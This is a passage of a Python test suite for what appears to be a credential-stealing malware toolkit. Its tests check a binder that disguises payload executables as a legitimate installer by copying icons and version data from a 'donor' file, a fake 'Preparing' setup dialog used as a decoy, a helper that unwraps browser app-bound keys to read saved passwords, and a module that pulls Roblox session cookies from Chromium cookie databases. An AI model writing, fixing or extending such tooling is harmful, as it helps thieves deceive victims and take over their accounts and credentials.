            file_version="6.2.9.441",
        )
    )

    # The block starts with its own length, then the key, then the fixed info. The
    # signature is at a known offset because the key is a fixed string.
    length, value_length, value_type = struct.unpack_from("<HHH", blob, 0)
    assert length == len(blob)
    assert value_type == 0
    assert value_length == 52

    fixed = 6 + len("VS_VERSION_INFO\0".encode("utf-16le"))
    fixed += (4 - fixed % 4) % 4
    assert struct.unpack_from("<I", blob, fixed)[0] == 0xFEEF04BD
    ms, ls = struct.unpack_from("<II", blob, fixed + 8)
    assert (ms >> 16, ms & 0xFFFF, ls >> 16, ls & 0xFFFF) == (6, 2, 9, 441)

    for text in ("Northline Software Ltd", "Northline Setup", "(c) 2026 Northline"):
        assert (text + "\0").encode("utf-16le") in blob


def test_a_version_block_with_nothing_in_it_is_absent_rather_than_empty() -> None:
    assert forge.version_blob(VersionConfig()) == b""


def test_a_version_block_that_is_too_large_is_refused() -> None:
    with pytest.raises(forge.ForgeError):
        forge.version_blob(
            VersionConfig(company="c" * (forge.MAX_VERSION_BYTES), file_version="1.0.0.0")
        )


def test_a_version_block_reads_back_into_the_fields_it_was_written_from() -> None:
    # The writer and the reader are the two halves of one format. A round trip is the
    # only test that catches a length counted in characters on one side and bytes on
    # the other, which is the failure that renders every other letter.
    asked = VersionConfig(
        company="Northline Software Ltd",
        product="Northline Setup",
        description="Setup loader",
        copyright="(c) 2026 Northline",
        original_name="northline-setup.exe",
        file_version="6.2.9.441",
        product_version="6.2.0.0",
    )

    assert forge.version_config(forge.version_blob(asked)) == asked


def test_a_version_block_without_a_file_version_string_takes_the_numbers() -> None:
    # Plenty of real installers carry only the fixed half. The four numbers are the
    # fallback, and they are the same four the properties sheet truncates to anyway.
    blob = forge.version_blob(VersionConfig(company="Northline", file_version="6.2.9.441"))
    strings_only = blob.replace("FileVersion".encode("utf-16le"), "FileVersioX".encode("utf-16le"))

    assert forge.version_config(strings_only).file_version == "6.2.9.441"


@pytest.mark.parametrize(
    "raw",
    [
        b"",
        b"\x00" * 8,
        struct.pack("<HHH", 6, 0, 0),
        struct.pack("<HHH", 0xFFFF, 0, 0),
    ],
)
def test_a_version_block_that_is_not_one_is_refused(raw: bytes) -> None:
    with pytest.raises(forge.ForgeError):
        forge.version_config(raw)


def test_a_donor_that_is_not_an_executable_is_refused(tmp_path: Path) -> None:
    text = tmp_path / "notes.exe"
    text.write_bytes(b"PK\x03\x04" + bytes(64))

    with pytest.raises(forge.ForgeError):
        forge.harvest(text)


def test_a_donor_that_is_not_there_is_refused(tmp_path: Path) -> None:
    with pytest.raises(forge.ForgeError):
        forge.harvest(tmp_path / "absent.exe")


def test_a_donor_on_a_script_build_is_a_note_rather_than_a_stop() -> None:
    problems = validate_module.validate(
        config(), mode=forge.OUTPUT_PY, donor=Path("C:/Windows/notepad.exe")
    )

    assert [problem.blocking for problem in problems] == [False]
    assert problems[0].path == "output.donor"


def test_a_donor_that_is_missing_is_blocked_at_the_form(tmp_path: Path) -> None:
    # A stub of its own rather than LAUNCHER: the subject here is the donor, and a tree
    # that has never run a freeze would otherwise report two problems and fail this
    # assert for a reason the test does not name.
    stub = tmp_path / "stub.exe"
    stub.write_bytes(b"MZ" + bytes(64))

    problems = validate_module.validate(
        config(), mode=forge.OUTPUT_EXE, stub=stub, donor=tmp_path / "absent.exe"
    )

    assert [(problem.path, problem.blocking) for problem in problems] == [
        ("output.donor", True)
    ]


@pytest.mark.skipif(
    not LAUNCHER.is_file(),
    reason="the launcher has not been built in this tree",
)
@needs_crypto
def test_a_donor_lends_its_icon_and_its_properties_block(tmp_path: Path) -> None:
    # The whole point of the donor: one artifact is built to look like something, and
    # the next build takes that look without anyone running a second tool over the
    # output. Measured on the file, not on the arguments.
    icon = tmp_path / "mark.ico"
    icon.write_bytes(ico([bytes(64), bytes(256)]))
    donor_version = VersionConfig(
        company="Northline Software Ltd",
        product="Northline Setup",
        file_version="6.2.9.441",
    )

    data = forge.payload(ROOT, config())
    donor = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "donor.exe",
        mode="exe",
        stub=LAUNCHER,
        icon=icon,
        version=donor_version,
    )

    taken = forge.harvest(donor)
    assert [len(item.data) for item in taken.icons] == [64, 256]
    # The writer fills a blank ProductVersion from the file version rather than leaving
    # the pair disagreeing, so the reader sees both spelled out. That is the format's
    # one asymmetry and it is deliberate.
    assert taken.version == VersionConfig(
        company="Northline Software Ltd",
        product="Northline Setup",
        file_version="6.2.9.441",
        product_version="6.2.9.441",
    )

    copied = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "copied.exe",
        mode="exe",
        stub=LAUNCHER,
        donor=donor,
    )

    raw = copied.read_bytes()
    assert forge.group_payload(list(taken.icons)) in raw
    for text in ("Northline Software Ltd", "Northline Setup", "6.2.9.441"):
        assert (text + "\0").encode("utf-16le") in raw


@pytest.mark.skipif(
    not LAUNCHER.is_file(),
    reason="the launcher has not been built in this tree",
)
@needs_crypto
def test_a_typed_field_wins_over_the_donor_field_by_field(tmp_path: Path) -> None:
    # A copied company name is exactly the string an operator wants to correct. Typed
    # wins per field; everything not typed still comes across.
    icon = tmp_path / "mark.ico"
    icon.write_bytes(ico([bytes(64)]))

    data = forge.payload(ROOT, config())
    donor = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "donor.exe",
        mode="exe",
        stub=LAUNCHER,
        icon=icon,
        version=VersionConfig(
            company="Northline Software Ltd",
            product="Northline Setup",
            file_version="6.2.9.441",
        ),
    )

    corrected = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "corrected.exe",
        mode="exe",
        stub=LAUNCHER,
        donor=donor,
        version=VersionConfig(company="Bench Holdings"),
    )

    restored = forge.version_config(
        forge.resource_data(
            corrected.read_bytes(),
            next(
                ref
                for ref in forge.resource_refs(corrected.read_bytes())
                if ref.kind == 16
            ),
        )
    )
    assert restored.company == "Bench Holdings"
    assert restored.product == "Northline Setup"
    assert restored.file_version == "6.2.9.441"


@pytest.mark.parametrize(
    ("version", "path"),
    [
        (VersionConfig(file_version="1.2.3"), "output.version.file_version"),
        (VersionConfig(product_version="1.2.3.70000"), "output.version.product_version"),
        (VersionConfig(company="a" * 300), "output.version.company"),
        (VersionConfig(copyright="bad\x07bell"), "output.version.copyright"),
    ],
)
def test_a_version_that_would_not_render_is_blocked_at_the_form(
    version: VersionConfig, path: str
) -> None:
    problems = validate_module.validate(config(version=version), mode=forge.OUTPUT_EXE)

    assert validate_module.blocking(problems)
    # The launcher is not part of what this is testing; an exe build with no stub is a
    # second blocking problem and filtering it keeps the assertion about one field.
    assert [problem.path for problem in problems if problem.path != "output.stub"] == [path]


def test_a_version_on_a_script_build_is_a_note() -> None:
    problems = validate_module.validate(
        config(version=VersionConfig(company="Northline")), mode=forge.OUTPUT_PY
    )

    assert [problem.blocking for problem in problems] == [False]
    assert problems[0].path == "output.version"


@pytest.mark.parametrize("seconds", [-1, 601])
def test_a_decoy_outside_its_window_is_blocked(seconds: int) -> None:
    problems = validate_module.validate(
        config(decoy_seconds=seconds, decoy_title="Setup", decoy_text="Preparing"),
        mode=forge.OUTPUT_EXE,
    )

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.decoy.seconds"


def test_a_decoy_with_no_text_is_an_empty_box_and_is_blocked() -> None:
    problems = validate_module.validate(
        config(decoy_seconds=10), mode=forge.OUTPUT_EXE
    )

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.decoy.title"


def test_zero_seconds_is_off_rather_than_a_zero_length_dialog() -> None:
    problems = validate_module.validate(config(decoy_seconds=0), mode=forge.OUTPUT_EXE)

    assert [problem for problem in problems if problem.path != "output.stub"] == []


def test_the_decoy_bounds_are_the_same_number_on_both_sides() -> None:
    # schema decides what a form may hold; the agent re-checks at runtime because the
    # values arrive from an archive. One number, declared twice, pinned here.
    from agent import decoy

    assert decoy.MAX_DECOY_SECONDS == schema.MAX_DECOY_SECONDS
    assert decoy.MAX_DECOY_TEXT == schema.MAX_DECOY_TEXT


def test_the_helper_flag_is_the_same_string_on_both_sides() -> None:
    # loader has to know the flag before the payload exists, and the payload is where
    # abe lives. One string, declared twice, pinned here.
    from agent import abe

    assert loader.HELPER_FLAG == abe.UNWRAP_FLAG


def test_the_helper_is_not_treated_as_a_second_instance(monkeypatch: pytest.MonkeyPatch) -> None:
    # The whole app-bound key depends on this. The running agent holds the mutex; the
    # helper re-execs the same image and would be refused as a duplicate before it read
    # its flag, which reads as "brave has no passwords" rather than "the unwrap died".
    monkeypatch.setattr(loader, "acquire", lambda *args: False)

    assert loader._guarded(["agent.exe", loader.HELPER_FLAG, "C:/temp/s1"]) is True
    assert loader._guarded(["agent.exe"]) is False


def test_a_decoy_of_zero_seconds_starts_no_thread() -> None:
    from agent import decoy

    assert decoy.start("Setup", "Preparing", 0) is None
    assert decoy.show("Setup", "Preparing", 0) is False


@pytest.mark.skipif(not LAUNCHER.is_file(), reason="the launcher has not been built")
def test_the_launcher_resource_table_is_read_before_it_is_written() -> None:
    refs = forge.resource_refs(LAUNCHER.read_bytes())

    kinds = {ref.kind for ref in refs}
    assert 3 in kinds and 14 in kinds
    groups = {ref.identifier for ref in refs if ref.kind == 14}
    # The binder reads this instead of assuming 1: a stub whose icon lives anywhere
    # else gets a second group when the id is assumed, and the shell picks.
    assert len(groups) == 1
    assert all(ref.language >= 0 for ref in refs)


def test_patching_nothing_is_refused_rather_than_writing_an_empty_cycle() -> None:
    with pytest.raises(forge.ForgeError):
        forge.patch_resources(Path("nowhere.exe"))
    with pytest.raises(forge.ForgeError):
        forge.patch_resources(Path("nowhere.exe"), icons=[])


# --- the frozen bundle -------------------------------------------------------


def test_the_archive_is_created_under_the_name_it_ships_as() -> None:
    """A zip written as ``payload.zip`` and renamed afterwards loses its name.

    Measured in the guest: every ``Path.replace`` was refused with ``WinError 32``
    because Defender's realtime scanner had the freshly written zip open, so the
    delivered file was ``payload-sealed.zip`` — no host, no run id. The second argument
    to ``make_archive`` is therefore computed, never a fixed name.
    """
    tree = ast.parse((ROOT / "agent" / "entry.py").read_text(encoding="utf-8"))

    calls = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr == "make_archive"
        and len(node.args) == 2
    ]
    assert len(calls) == 1, "one archive, one destination"

    destination = calls[0].args[1]
    assert not isinstance(destination, ast.Constant), (
        f"archive destination is a fixed name: {ast.dump(destination)[:80]}"
    )


def _launcher_imports():
    """``tools/launcher_imports.py``, loaded by path: ``tools/`` is not a package."""
    path = ROOT / "tools" / "launcher_imports.py"
    spec = importlib.util.spec_from_file_location("sable_launcher_imports", path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_the_spec_does_not_keep_its_own_copy_of_the_import_list() -> None:
    """A hand-typed list only ever tests the list. It drifted once: ``uuid``."""
    text = (ROOT / "tools" / "sable-launcher.spec").read_text(encoding="utf-8")

    assert "launcher_imports" in text
    assert "PAYLOAD_STDLIB" not in text


def test_every_payload_import_reaches_the_frozen_bundle() -> None:
    """Walk ``agent/`` here rather than trusting the helper to audit itself."""
    launcher = _launcher_imports()
    covered = set(launcher.hidden_imports(ROOT / "agent"))

    found: set[str] = set()
    for path in sorted((ROOT / "agent").rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    found.add(alias.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom) and not node.level and node.module:
                found.add(node.module.split(".")[0])

    missing = {name for name in found if name not in {"agent", "core", "__future__"}} - covered
    assert missing == set()
    # The one that was missing in the guest, named so the failure is legible.
    assert "uuid" in covered


# --- ASCII purity -------------------------------------------------------------
# The archive is read by tools that assume plain ASCII: a parser, a shell, a paste into
# someone else's console. A vendor display name or an emoticon in a caption is not worth
# a mojibake column in the one document that has to survive transport.

_EMOJI_RANGES = (
    (0x1F000, 0x1FAFF),
    (0x2600, 0x27BF),
    (0xFE0F, 0xFE0F),
    (0x1F1E6, 0x1F1FF),
)
_SEPARATORS = (0x00B7, 0x2022)


def test_no_emoji_or_middot_survives_in_the_shipped_source() -> None:
    offenders: list[str] = []
    for package in ("agent", "core", "app", "tools"):
        base = ROOT / package
        if not base.is_dir():
            continue
        for path in sorted(base.rglob("*.py")):
            if "__pycache__" in path.parts:
                continue
            text = path.read_text(encoding="utf-8", errors="replace")
            for number, line in enumerate(text.splitlines(), 1):
                for char in line:
                    point = ord(char)
                    banned = any(low <= point <= high for low, high in _EMOJI_RANGES)
                    if banned or point in _SEPARATORS:
                        offenders.append(
                            f"{path.relative_to(ROOT).as_posix()}:{number}: U+{point:04X}"
                        )
                        break
    assert offenders == []


def test_json_output_escapes_every_non_ascii_byte(tmp_path: Path) -> None:
    from agent import util

    target = tmp_path / "identity.json"
    payload = {"name": "caf\u00e9", "global": "\U0001f600", "plain": "bench"}

    assert util.write_json(target, payload)
    raw = target.read_bytes()
    assert all(byte < 128 for byte in raw)
    assert json.loads(raw.decode("ascii")) == payload


# --- the Roblox store read ----------------------------------------------------
# The defect these pin: the store read used to take the newest N rows of the cookie
# table and filter by name afterwards, so a session older than the newest N was
# invisible and the status file said "no row" about a row that was there.


def chromium_cookie_store(profile: Path, rows: list[tuple[str, str, str, bytes, int]]) -> None:
    (profile / "Network").mkdir(parents=True, exist_ok=True)
    (profile / "Preferences").write_text("{}", encoding="utf-8")
    store = sqlite3.connect(str(profile / "Network" / "Cookies"))
    store.execute(
        "CREATE TABLE cookies (host_key TEXT, name TEXT, value TEXT, "
        "encrypted_value BLOB, last_access_utc INTEGER)"
    )
    store.executemany(
        "INSERT INTO cookies VALUES (?,?,?,?,?)",
        rows,
    )
    store.commit()
    store.close()


def test_roblox_reads_the_domain_not_the_newest_rows(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from agent.sources import browsers, roblox

    user_data = tmp_path / "User Data"
    profile = user_data / "Default"
    token = roblox_token(b"OLD")

    rows: list[tuple[str, str, str, bytes, int]] = [
        (".example.com", f"sid{index}", "x", b"", 2_000_000_000 + index)
        for index in range(300)
    ]
    # Older than every row above, which is exactly the case a recency cap loses.
    rows.append((".roblox.com", ".ROBLOSECURITY", token, b"", 1_000_000_000))
    chromium_cookie_store(profile, rows)

    monkeypatch.setattr(
        browsers, "chromium_roots", lambda: (browsers.Root("brave", user_data, False),)
    )
    monkeypatch.setattr(roblox.browsers, "gecko_roots", lambda: ())

    tokens, detail = roblox._chromium_tokens()
    assert tokens == [token]

    record = detail["records"][0]
    assert record["profile"] == "brave/Default"
    assert record["rows"] == 1
    assert record["named"] == 1
    assert record["found"] == 1
    assert record["reason"] == "ok"
    assert record["prefixes"] == {"plain": 1}


def test_roblox_reports_a_v20_row_it_could_not_open(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from agent.sources import browsers, roblox

    user_data = tmp_path / "User Data"
    profile = user_data / "Default"
    chromium_cookie_store(
        profile,
        [(".roblox.com", ".ROBLOSECURITY", "", b"v20" + b"\x00" * 64, 2_000_000_000)],
    )

    monkeypatch.setattr(
        browsers, "chromium_roots", lambda: (browsers.Root("chrome", user_data, False),)
    )

    tokens, detail = roblox._chromium_tokens()
    assert tokens == []

    record = detail["records"][0]
    assert record["named"] == 1
    assert record["prefixes"] == {"v20": 1}
    assert record["found"] == 0
    assert record["reason"] == "key_missing"
    assert record["detail"].startswith("v20 row")
    assert detail["reasons"] == {"key_missing": 1}
    assert detail["reason"] == "key_missing"


def test_roblox_accepts_a_name_without_the_leading_dot(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from agent.sources import browsers, roblox

    user_data = tmp_path / "User Data"
    profile = user_data / "Default"
    token = "0123456789abcdefghijklmnopqrstuvwxyz" * 3
    chromium_cookie_store(
        profile,
        [(".roblox.com", "ROBLOSECURITY", token, b"", 2_000_000_000)],
    )

    monkeypatch.setattr(
        browsers, "chromium_roots", lambda: (browsers.Root("edge", user_data, False),)
    )

    tokens, detail = roblox._chromium_tokens()
    assert tokens == [token]
    assert detail["records"][0]["reason"] == "ok"


def test_roblox_ignores_the_tracker_cookie(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from agent.sources import browsers, roblox

    user_data = tmp_path / "User Data"
    profile = user_data / "Default"
    tracker = "RBXSessionTracker" + "a1b2c3d4" * 20
    chromium_cookie_store(
        profile,
        [(".roblox.com", "RBXSessionTracker", tracker, b"", 2_000_000_000)],
    )

    monkeypatch.setattr(
        browsers, "chromium_roots", lambda: (browsers.Root("brave", user_data, False),)
    )

    tokens, detail = roblox._chromium_tokens()
    assert tokens == []
    assert detail["records"][0]["named"] == 0
    assert detail["records"][0]["reason"] == "empty"
